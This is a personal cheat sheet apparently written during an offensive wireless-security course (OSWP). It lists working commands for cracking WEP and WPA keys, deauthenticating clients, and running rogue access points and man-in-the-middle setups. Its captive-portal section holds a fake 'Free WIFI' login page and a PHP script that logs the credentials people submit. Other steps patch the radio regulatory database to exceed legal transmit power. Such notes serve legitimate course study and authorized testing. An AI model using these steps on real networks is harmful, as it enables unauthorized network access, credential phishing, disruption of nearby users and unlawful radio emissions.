# OffSec WiFu_V3 Notes
```
notes/cheatsheet created by ~LBr during OSWP course
```

* * *
## A. Table of Content

[TOC]

* * *

## 1. general / introduction

### 1.2 aircrack-ng suite

#### 1.2.1 airmon-ng
Tool to put wireless device in monitoring mode

- check if processes are running that could cause trouble
`> airmon-ng check`

- end processes that could case trouble
`airmon-ng check kill`

- put wireless card in monitoring mode
`> airmon-ng start <device> <channel>`

- disable monitoring mode
`> airmon-ng stop <monitoring device>`

#### 1.2.2 airodump-ng
Tool to capture the wireless packets and save it in a file for later cracking.

- start capturing on device for specific AP
`> airodump-ng -c <channel> --bssid <AP MAC> -w <dumpfile.name> <monitoring device>`

#### 1.2.3 aireplay-ng
Tool to inject wireless packets into APs and Clients

- test injection abilities of a device
`> aireplay-ng -9 <monitoring device>`

- card to card injection test
`> aireplay-ng -9 -i <receiving card> <monitoring device>`

#### 1.2.4 airserv-ng
Tool to share wireless device over network for several users.

- Sharing wifi device via network (useful for sniffing drones)
`> airserv-ng -p <port> -d <device> -c <channel> -v <verbosity>`

#### 1.2.5 airdecap-ng
With a succesfully retrieved key airdecap can decrypt capture files. It can also strip the wireless headers.

- removing wireless headers from an unencrypted capture file
`> airdecap-ng -b <AP MAC> <capture file>`

- decrpyt a WEP encrypted capture file
`> airdecap-ng -w <WEP key> <capture file>`

- decrypt a WPA2 encrpyted capture file
`> airdecap-ng -e <AP name> -p <WPA password> <capture file>`

#### 1.2.6 airtun-ng
Virtual interface creator to decrypt wireless trffic in real time. It can also inject arbitrary traffic into the network. it can also act as an repeater and e.g. replay traffic.

- create new tun interface with given WEP key
`> airtun-ng -a <AP MAC> -w <WEP Key> <mon dev>`

#### 1.2.7 airolib-ng
Tool to precompute master key pairs PWKs (SSID/password) for WPA cracking using a database to speed up brute force by aircrack.

- show db stats
`> airolib-ng <db filename> --stats`

- import essid list via a file
`> airolib-ng <db filename> --import essid <essid.list>`

- import password list
`> airolib-ng <db filename> --import passwd <password file>`

- generate the PMKs (Pairwise Master Key) with batching the essid and pws
`> airolib-ng <db filename> --batch`

## 2. information gathering / preparation

### 2.1 scanning

- list available SSIDs in range
`> iw dev <device> scan |grep SSID`
or
`> iwlist <device> scanning |grep ESSID`

- list available AP with Channel in range
`> iw dev <device> scan |egrap "DS\ Parameter\ set|SSID"`
or
`> iwlist <device> scanning |egrep "ESSID|Channel"`

### 2.2 prepare attacking system

- create monitoring interface
`> iw dev <device> interface add mon0 type monitor`

- delete monitoring IF/VAP
`> iw dev <monitoring I/F> interface del`

- put device in monitoring mode on specific channel
`> iwconfig <device> mode monitor channel <channel>`

- put card in managed mode
`> iwconfig <device> mode managed`

- show current monitored channel
`> iwlist <monitoring device> channel`

- set bash enviroment variables (very helpful for mac addr of AP,VIC,HOST)
`> for var in $(cat <var file>); do echo export $var >> .bashrc; done`

### 2.3 wireless reconnaissance

#### 2.3.1 airgraph-ng
Script that creates graphs of Wifi networks using the csv of airodump-ng

- client to AP relationship (CAPR) graph
`> airgraph-ng -i <csv file> -g CAPR -o <out file>`

- client probe graph (e.g. an AP is not in range but a client and useful for rogue APs)
`> airgraph-ng -i <csv file> -g CPG -o <out file>` 

#### 2.3.2 KISMET
Wireless scanner, detector sniffer and IDS.
Client Server Architecture.

#### 2.3.3 GISKismet
Use kismet gathered data with GPS receiver and create google maps *.kml files
Stores kismet *.netxml in a db.

- import netxml file
`> giskismet -x <kismet netxml file>`

- generate a kml file
`> giskismet -q "select * from wirelss" -o <out.kml>`

- create a WEP AP filtered kml file
`> giskismet -q "select * from wirelss where Encryption='WEP'" -o <out.kml>

### 2.3 creating wordlist / rainbow tables

#### 2.3.1 wordlists with john
- using JtR word mangling rule to create better wordlist
`> ./john --wordlist=<wordlist> --rules --stdout`
make sure to set right rule in john.conf (e.g. adding 2 digits at the end of each word --> $[0-9]$[0-9])

#### 2.3.2 wordlists with cewl
- crawl a website to create wordlist (-d option is level of url following)
`> cewl -d 3 -e <url> > <out.file>`

#### 2.3.3 wordlists with crunch
- create 'file/wordlist with every combination of 'string' from 2-6 characters
`> crunch 2 6 'string' > 'file.txt'`

- create customized wordlist using wildcards (@) for each wildcard the characters after the -t option are used
`> crunch <wordlenght> <wordlength> -t <characters> @@@<fix characters>@@@ `

#### 2.3.4 rainbow tables with airolib-ng
- import essid list via a file
`> airolib-ng <db filename> --import essid <essid.list>`

- import password list
`> airolib-ng <db filename> --import passwd <password file>`

- generate the PMKs (Pairwise Master Key) with batching the essid and pws
`> airolib-ng <db filename> --batch`

#### 2.3.5 rainbow tables with coWPAtty
- generating the rainbow tables for a ESSID
`> genpmk -f <wordlist> -d <rainbow file> -s <ESSID>`

#### 2.3.6 rainbow tables with Pyrit
- import wordlist in db
`> pyrit -i <wordlist> import_passwords`

- add essid to db
`> pyrit -e <AP name> create_essid`

- create PMKs
`> pyrit batch`

## 3. WEP cracking

### 3.1 WEP cracking with clients

#### 3.1.1 fake authentication attack
Asociates the attackers machine with the target AP so sent packets aren´t rejected by the AP.

- no ARP packets are created
- useful if no clients are connected
- performed before a lot of wireless attacks in order to send packets to the AP without beeing rejected

**performing the attack:**

1. put device in monitoring mode (see airmon-ng)
2. capture packets and save it to a file (see airodump-ng)
3. perform fake auth
`> aireplay-ng -1 0 -e <AP name> -a <AP MAC> -h <mon device MAC> <mon device>`
If not succesful after some tries, probably MAC address filtering is enabled on the AP. In this case identify an associated client and wait for it to disconnect to use its MAC address.

#### 3.1.2 deauthentication attack
sends deauth packet to an associated clients and forcing them to reauthenticate

- useful to dicover hidden SSIDs
- useful to capture WPA/WPA2 handshakes
- in some setups ARP packets are send when a client reconnects

**performing the attack:**

1. put device in monitoring mode (see airmon-ng)
2. capture packets and save it to a file (see airodump-ng)
3. fake authenticate with the AP (see fake auth attack)
4. perform deauth of a client
`> aireplay-ng -0 1 -a <AP MAC> -c <VicClient MAC> <mon device>`

#### 3.1.3 arp request replay attack
Best way to create new initialization vectors (IVs). Areplay listens for a ARP Packet and once found retransmits it to the AP. This brings the AP to answer with ARP new initialization vector (IV) . Aireplay repeats this over and over and so collects a lot of initialzation vectors. This is the basis for cracking the WEP Key with aircrack.

**performing the attack:**

1. put device in monitoring mode (see airmon-ng)
2. capture packets and save it to a file (see airodump-ng)
3. fake authenticate with the AP (see fake auth attack)
4. sending arp requests once captured
`> aireplay-ng -3 -b <AP MAC> -h <mon dev MAC> <mon device>`

5. to speed things up one could run a deauth attack on associated clients (see DeAuth Attack)

#### 3.1.4 aircrack the WEP key

**performing the attack:**

1. put device in monitoring mode (see airmon-ng)
2. capture packets and save it to a file (see airodump-ng)
3. fake authenticate with the AP (see fake auth attack)
4. sending arp requests once captured (see ARP relay attack)
5. Cracking the WEP Key
`aircrack-ng -0 <dumpfile.name>`

#### 3.1.5 summarize WEP attack with clients

1. put device in monitoring mode (see airmon-ng)
`> airmon-ng start <device> <channel>`

2. capture packets and save it to a file (see airodump-ng)
`> airodump-ng -c <channel> --bssid <AP MAC> -w <dumpfile.name> <monitoring device>`

3. fake authenticate with the AP (see fake auth attack)
`> aireplay-ng -1 0 -e <AP name> -a <AP MAC> -h <mon device MAC> <mon device>`

4. sending arp requests once captured (see ARP Replay Attack and DeAuth Attack)
`> aireplay-ng -3 -b <AP MAC> -h <mon dev MAC> <mon device>`
optional deauth attack against a client to speed up ARP capturing:
`> aireplay-ng -0 1 -a <AP MAC> -c <VicClient MAC> <mon device>`

5. cracking the WEP Key
`aircrack-ng -0 <dumpfile.name>`

### 3.2 WEP cracking via a client
Attack a connected client and force it to create IVs.

- good for APs with restrictions
- if AP is out of reach but a client is within

#### 3.2.1 preparation

1. put device in monitoring mode
`> airmon-ng start <device> <channel>`

2. capture packets and save it to a file (
`> airodump-ng -c <channel> --bssid <AP MAC> -w <dumpfile.name> <monitoring device>`

3. fake authenticate with the AP
`> aireplay-ng -1 0 -e <AP name> -a <AP MAC> -h <mon device MAC> <mon device>`

#### 3.2.2 interactive packet replay attack
Choose a specific Packet and send it to AP to create IVs. A perfect Packet would be a ARP Packet.
Packet must be destent to broadcast network and has to come from DS. The ARP has to be for that specific client.

- get interactive packet capturing dialogue:
`> aireplay-ng -2 -b <AP MAC> -d <Broadcast Addr. e.g. FF:FF:FF:FF:FF:FF> -f 1 -m 68 -n 86 <mon dev>`
wait for a suitable packet to arrive and use it for replay.

- use a precaptured packet in a capture file to replay
`> aireplay-ng -2 -r <capture filename> <device>`

#### 3.2.3 aircrack the WEP key
once enough IVs are captured, use aircrack to crack WEP key.

- z for PTW attack, n for bit length of WEP key
`> aircrack-ng -0 -z -n 64 <dumpfile.name>`

#### 3.2.4 summarize WEP crack via client

1. put device in monitoring mode
`> airmon-ng start <device> <channel>`

2. capture packets and save it to a file
`> airodump-ng -c <channel> --bssid <AP MAC> -w <dumpfile.name> <monitoring device>`

3. fake authenticate with the AP
`> aireplay-ng -1 0 -e <AP name> -a <AP MAC> -h <mon device MAC> <mon device>`

4. get interactive packet capturing dialogue and replay the packet to AP (-f is filtering the "fromDS" packets:
`> aireplay-ng -2 -b <AP MAC> -d <Broadcast Addr. e.g. FF:FF:FF:FF:FF:FF> -f 1 -m 68 -n 86 <mon dev>`

5. cracking the WEP Key
`> aircrack-ng -0 -z -n 64 <dumpfile.name>`

### 3.3 WEP cracking clientless
ChopChop and fragmentation attacks are used to optain a PRGA bitfile.

#### 3.3.1 preparation

1. put device in monitoring mode
`> airmon-ng start <device> <channel>`

2. capture packets and save it to a file
`> airodump-ng -c <channel> --bssid <AP MAC> -w <dumpfile.name> <monitoring device>`

3. fake authenticate with the AP and stay connected (every 60sec reauthenticate)
`> aireplay-ng -1 60 -e <AP name> -a <AP MAC> -h <mon device MAC> <mon device>`

#### 3.3.2 fragmentation attack
Optain PRGA keystream . Used with packetforge-ng to replay optained packet.
Repeats until 1500 bytes of PRGA are obtained.

1. starting fragmentation attack dialogue and crate keystream file *.xor for packetforge
`> aireplay-ng -5 -b <AP MAC> -h <mon MAC> <mon dev> `

2. create encrypted ARP packet with packetforge-ng for injection
`> packetforge-ng -0 -a <AP MAC> -h <mon MAC> -l <source IP> -k <dest IP> -y <file.xor> -w <inject.file> `

3. inject created file into AP to create new IVs using interactive packet replay attack
`> areplay-ng -2 -r <inject.file> <mon dev>`

4. cracking the WEP Key
`> aircrack-ng -0 -z -n 64 <dumpfile.name>`

#### 3.3.3 KoreK chopchop attack
Decrypt WEP packet without knowing the key. Per byte recovery of key stream.
Can be used for:

- blind portscan the network
- decrypt interesting packets to learn about the network
- forge snmp packets
- create ARP request for IV generation

1. receive packet for decryption dialogue and create *.cap and *.xor file
`> aireplay-ng -4 -b <AP MAC> -h <mon MAC> <mon dev>`

2. create encrypted ARP packet with packetforge-ng for injection
`> packetforge-ng -0 -a <AP MAC> -h <mon MAC> -l <source IP> -k <dest IP> -y <file.xor> -w <inject.file> `

3. inject created file into AP to create new IVs using interactive packet replay attack
`> areplay-ng -2 -r <inject.file> <mon dev>`

4. Cracking the WEP Key
`> aircrack-ng -0 -z -n 64 <dumpfile.name>`

### 3.4 bypassing WEP SKA (shared key authentication)

#### 3.4.1 preparation

1. put device in monitoring mode
`> airmon-ng start <device> <channel>`

2. capture packets and save it to a file
`> airodump-ng -c <channel> --bssid <AP MAC> -w <dumpfile.name> <monitoring device>`

3. fake authenticate attack with the AP (should be failing due to SKA)
`> aireplay-ng -1 0 -e <AP name> -a <AP MAC> -h <mon device MAC> <mon device>`

#### 3.4.2 fake Shared key authentication
Capture are pseudo random number generator algorithm (PRGA) *.xor file when a clients connects. To speed things up one could deauthenticate a already connected client.

1. DeAuth Attack on a client
`> aireplay-ng -0 1 -a <AP MAC> -c <VicClient MAC> <mon device>`
airodump should now display SKA under the auth column and the *.xor file should be available in the current folder

2. perform shared key fake athentication attack
`> aireplay-ng -0 60 -e <AP name> -y <xor file> -a <AP MAC> -h <mon MAC> <mon dev>`

#### 3.4.3 arp request relay attack

- waiting for ARP packet and retransmitts it to the AP to generate IVs
`> aireplay-ng -3 -b <AP mac> -h <mon MAC> <mon device>`
do another DeAuth attack to speed up process of receiving ARP packet
and then crack WEP with aircrack-ng


## 4. WPA PSK cracking
Capture four way handshake (4WH) (whenever a clients connects to the AP) to brute force the PSK later.

### 4.1 crack WPA with aircrack

#### 4.1.1 preparation

1. put device in monitoring mode
`> airmon-ng start <device> <channel>`

2. capture packets and save it to a file
`> airodump-ng -c <channel> --bssid <AP MAC> -w <dumpfile.name> <monitoring device>`

#### 4.1.2 deauth attack to capture 4WH
- run deauth attack on a client
`> aireplay-ng -0 1 -a <AP MAC> -c <VicClient MAC> <mon device>`
WPA 4WH should be displayed in airodump window and saved to a file in current folder

#### 4.1.3 crack WPA with aircrack
- cracking password using a wordlist
`> aircrack-ng -0 -w <wordlist> <capture file>`

- cracking password with precomputed PMKs (see airolib-ng)
`> aircrack-ng -0 -r <airolib dbname> <capture file>`

### 4.2 crack WPA with John the Ripper
Using the advanced wordlist crating rules of JtR and combine it with aircrack.

#### 4.2.1 preparation

1. put device in monitoring mode
`> airmon-ng start <device> <channel>`

2. capture packets and save it to a file
`> airodump-ng -c <channel> --bssid <AP MAC> -w <dumpfile.name> <monitoring device>`

#### 4.2.2 deauth attack for 4WH
- deauh a client to capture 4WH while it reconnects
`> aireplay-ng -0 1 -a <AP MAC> -c <VicClient MAC> <mon device>`

#### 4.2.3 cracking WPA with JtR wordlist and aircrack
1. using JtR word mangling rule to create better wordlist
`> ./john --wordlist=<wordlist> --rules --stdout`
make sure to set right rule in john.conf (e.g. adding 2 digits at the end of each word --> $[0-9]$[0-9])

2. combine word JtR mangling with aircrack-ng
`> ./john --wordlist=<wordlist> --rules --stdout | aircrack-ng -0 -e <AP name> -w - <4WH capture file>`

### 4.3 cracking WPA with coWPAtty
Useful tool for dictionary and rainbowtable attacks to recover WPA keys.

#### 4.3.1 preparation

1. put device in monitoring mode
`> airmon-ng start <device> <channel>`

2. capture packets and save it to a file
`> airodump-ng -c <channel> --bssid <AP MAC> -w <dumpfile.name> <monitoring device>`

3. deauh attack against a client to capture 4WH while it reconnects
`> aireplay-ng -0 1 -a <AP MAC> -c <VicClient MAC> <mon device>`

#### 4.3.2 cracking WPA with coWPAtty
- crack with dictionary attack (-2 for non strict mode)
`> cowpatty -r <4WH capture file> -f <wordlist> -2 -s <AP name>`

- generating the rainbow tables for a ESSID
`> genpmk -f <wordlist> -d <rainbow file> -s <ESSID>`

- crack with precomputed rainbow tables
`> cowpatty -r <4WH capture file> -d <rainbow file> -2 -s <AP name>`

### 4.4 cracking WPA with pyrit
Uses precomputed keytables by using the GPU instead of the CPU. Dictionary attack is also possible.
It read compressed or uncompressed rar capture files or directly from an interface, so no external 4WH capture
e.g. with airodump-ng is necessary.

#### 4.4.1 preparation
1. put device in monitoring mode
`> airmon-ng start <device> <channel>`

2. capture packets and save it to a file
`> airodump-ng -c <channel> --bssid <AP MAC> -w <dumpfile.name> <monitoring device>`

3. deauh attack against a client to capture 4WH while it reconnects
`> aireplay-ng -0 1 -a <AP MAC> -c <VicClient MAC> <mon device>`

#### 4.4.2 pyrit features
- analyze the captured 4WH in capture file if it is valid
`> pyrit -r <4WH capture file> analyze`

- removing all the overhead and unnecessary packets in a 4WH capture file
`> pyrit -r <4WH capture file> -o <output filename> strip`

#### 4.4.3 dictionary attack
- basic dictionary attack
`> pyrit -r <4WH stripped capture file> -i <wordlist> -b <AP MAC> attack_passthrough`


#### 4.4.4 database attack
- see db content
`> pyrit eval`

- import wordlist in db
`> pyrit -i <wordlist> import_passwords`

- add essid to db
`> pyrit -e <AP name> create_essid`

- create PMKs
`> pyrit batch`

- run db attack
`> pyrit -r <4WH stripped capture file> attack_db`

- list GPU and CPU cores
`> pyrit list_cores`

- run benchmark test
`> pyrit benchmark`

## 5. rogue access points

If you are in Bolivia:  Amp up the TX power of the wireless card.

1. set wifi regulation to Bolivia (1000mW / 30 dBm are allowed)
`> iw reg st BO`

2. set your tx power to 30 dBm
`> iw config <device> txpower 30`

### 5.1 airbase-ng
Main idea is to associate a fake AP.
Answer every probe with a valid answer.
prep by place dev in monitoring mode.


#### 5.1.1 basic fake AP without encryption
- start basic fake AP
`airbase-ng -c 3 -e <name e.g. freewifi> <mon dev>`

#### 5.1.2 fake marker1
Useful if a AP in out of range but a client is.
Try to trick client into fake AP with same name as target AP.

1. capture packets on monitoring device for WPA handshake
`> airodump-ng -c <channel> -d <mon dev MAC> -w <capture file> <mon dev>`

2. start basic fake AP (-z 4 for WPA2 CCMP, -W 1 forces beacons to specify encryption )
`airbase-ng -c 3 -e <target AP name> -z 4 -W 1 <mon dev>`

### 5.2 karmetasploit
Evil child of aircrack-ng , metasploit framework and karma attack.
Karma answers every probe sent out by clients.
Once a client authenticates, wide variety of attacks are possible.

#### 5.2.1 preparation
1. put device in monitoring mode
`> airmon-ng start <device> <channel>`

2. start fake AP (-P to respond to all probe requests, -C 60 rebroadcast every 60sec)
`airbase-ng -c 3 -P -C 60 -e <name e.g. freewifi> -v <mon dev>`

3. configure newly created interface (e.g. at1) and assign ip address
`> ifconfig <dev> up <ip/mask>`

#### 5.2.2 configure DHCP server
1. create directory for DHCP PID file
`> mkdir -p /var/run/dhcpd`

2. change ownership of directory to dhcp daemon
`> chown -R dhcpd:dhcpd /var/run/dhcpd`

3. create an empty lease file
`> touch /var/lib/dhcp3/dhcpd.leases`

4. create a temp dhcp server config file
```
default-lease-time 60;
max-lease-time 72;
ddns-update-style none;
authoritative;
log-facility-local7;
subnet 10.0.0.0 netmask 255.255.255.0 {
range 10.0.0.100 10.0.0.254;
option routers 10.0.0.1;
option domain-name-servers 10.0.0.1;}
```

5. create empty log file
`> touch /tmp/dhcp.log && chown dhcpd:dhcpd /tmp/dhcp.log`

6. run dhcp server (-f for service)
`dhcp3 -f -cf <dhcpd.conf> -pf <pid.file> -lf <logfile> <at1 interface>`

#### 5.2.3 setup and run karmetasploit
download karma.rc from offsec

- run msfconsole
`> msfconsole -r karma.rc`

### 5.3 MITM attack

#### 5.3.1 preparation 
1. put device in monitoring mode
`> airmon-ng start <device> <channel>`

2. start fake AP (-P to respond to all probe requests, -C 60 rebroadcast every 60sec)
`airbase-ng -c 3 -P -C 60 -e <name e.g. freewifi> -v <mon dev>`

#### 5.3.2 bridge connection to another interface (e.g. the wired one)
1. add a bridged interface
`> brctl addbr <custom bridge name> `

2. add interfaces to the new bridge
`> brctl addif <bridge name> <dev1 e.g. eth0>`
`> brctl addif <bridge name> <dev2 e.g. at0>`

3. assign ip addresses and bring em up
`> ifconfig <dev1 e.g.eth0> 0.0.0.0 up`
`> ifconfig <dev2 e.g.at0> 0.0.0.0 up`
`> ifconfig <bridge name> <valid ip of dev1> up`

4. enable ip forwarding
`> echo 1 > /proc/sys/net/ipv4/ip_forward`

#### 5.3.3 post attack

- run ettercap sniffing
- dnsspoof adresses to direct to beef xxs
- record entire traffic
- remote attack machine with msf

### 5.4 WPA Hotspot with Captive Portal
Setup an AP with DHCP , traffic forwarding and captive portal for credential phishing.

Create an WiFi Hotspot on `<wifi dev>` and route traffic to `<LAN dev>'.

1. bring up `<wlan dev>`
`> ifconfig <wlan dev> <ip>`

#### 5.4.1 increase txpower (kali rolling / bleeding edge)

1. install dependencies
`> apt install libnl-3-dev libgcrypt11-dev libnl-genl-3-dev pkg-config`

2. download CRDA and wireless-regdb
`> wget http://drvbp1.linux-foundation.org/~mcgrof/rel-html/crda/<latest version>.tar.xz`
scroll all the way down and download the *.tar.xz
`> wget https://www.kernel.org/pub/software/network/wireless-regdb/<file>.tar.xz`

3. extract files
`> unxz <crda-latest>.tar.xz`
`> unxz <wireless-regdb-version>.tar.xz`
then
`> tar -xf <crda-latest>.tar`
`> tar -xf <wireless-regdb-version>.tar`

4. edit wireless-regdb in extracted regdb folder and make file 
search for e.g. Bolivia (BO) and change the content of db.txt for Bolivia (BO) to lets say 30, then save the file and type `> make`

5. replace regulatory.bin in /lib/crda (backup old one before)
`> cp <extracted regdb dir>/regulatory.bin /lib/crda/`

6. copy pem files from extracted regdb dir to extracted crda directory and from /lib/crda
`> cp *.pem /<extracted crdadir>/pubkeys/`
`> cp /lib/crda/pubkeys/benh@debian.org.key.pub.pem /<crda extract dir>/pubkeys`

7. edit Makefile in crda extract dir and make install
Change 3rd line from `REG_BIN?=/usr/lib/crda/regulatory.bin` to `REG_BIN?=/lib/crda/regulatory.bin`.
With ctrl+w search for '-Werror' remove it and save the file.
then `> make` and `> make install`

8. increase txpower to max 20 (only if you are in Bolivia to 30 ;) )
`> iw reg set BO`
`> ifconfig <wlan device> down`
`> iwconfig <wlan device> txpower <value>`

#### 5.4.2 setup dhcpd
1. install isc-dhcp-server
`apt install isc-dhcp-server`

2. adapting config file /etc/dhcp/dhcpd.conf
```
      default-lease-time 300;
      max-lease-time 360;
	  ddns-update-style none;
      authoritative;
      log-facility local7;
      subnet 192.168.0.0 netmask 255.255.255.0 {
      range 192.168.0.100 192.168.0.200;
      option routers 192.168.0.1;
      option domain-name-servers 192.168.17.2;
      }
```

#### 5.4.3 setup hostapd
1. install hostapd
`apt install hostaptd`

2. adapting hostapd config in /etc/hostapd/hostapd.conf
```
	# Define interface
	interface=wlan0
	driver=nl80211
	# Select driver
	ssid=myhotspot
	# Set access point name
	hw_mode=g
	# Set access point harware mode to 802.11g
	# Enable WPA2 only (1 for WPA, 2 for WPA2, 3 for WPA + WPA2)
	# Set WIFI channel (can be easily changed)
	channel=6
	#wpa=2
	#wpa_passphrase=mypassword
```

#### 5.4.4 configure iptables and traffic forwarding
1. enable IP forwarding
`> echo "1" > /proc/sys/net/ipv4/ip_forward`

2. flush iptable rules
`> iptables -t nat -F`

3. enable traffic masquerading
`> iptables -t nat -A POSTROUTING -o <LAN dev> -j MASQUERADE`

4. send all wifi traffic to the webserver
`> iptables -t nat -A PREROUTING -i <wifi dev> -p tcp -j DNAT --to-destination <webserverip:port>`


#### 5.4.5 setup capture portal site
1. create simple html login page
```
<html>
<head>
  <title>Login</title>
</head>
<h3>Free WIFI</h3>
<p>Enter Username and Password:</p>
<form action="log.php" method = "get">
  <label for="username">Username</label> <input type="username" id="usename" name="username"><br /><br />
  <label for="password">Password:</label> <input type="text" id="password" name="password"><br /><br />
  <button type = "submit">Login</button>
  <button type = "submit">Sign Up</button>
</form>
</html>
```

2. create simple php logging script
```
<?php
$handle = fopen("log.txt", "a");
foreach($_GET as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>
```

3. copy both files to www directory
`cp <pwd>/* /var/www/html/`

4. start apache2 webserver
`service apache2 start`



---

## B. unsorted
- pipe output in "less" command (useful with long command outputs)
`> <command> | less`

- count words in a file
`> wc -l <file>`
